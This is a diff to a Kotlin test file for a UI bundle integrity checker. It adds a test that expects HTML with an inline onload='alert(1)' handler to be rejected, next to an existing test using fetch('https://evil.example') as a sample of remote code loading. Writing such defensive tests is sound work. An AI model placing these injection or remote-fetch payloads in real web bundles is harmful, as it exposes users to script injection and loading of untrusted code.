@@ -30,6 +30,11 @@ class UiBundleIntegrityTest {
         assertTrue(UiBundleIntegrity.isSafeContent("app.js", safe))
     }
 
+    @Test fun rejectsInlineHtmlEventHandlers() {
+        val unsafe = "<html><head><meta http-equiv='Content-Security-Policy' content=\"default-src 'self'; script-src 'self'\"></head><body onload='alert(1)'></body></html>".toByteArray()
+        assertFalse(UiBundleIntegrity.isSafeContent("index.html", unsafe))
+    }
+
     @Test fun rejectsJavascriptThatCanReachRemoteOrDynamicCodeExecution() {
         val unsafe = "fetch('https://evil.example')".toByteArray()
         assertFalse(UiBundleIntegrity.matches("app.js", unsafe, UiBundleIntegrity.sha256(unsafe)))
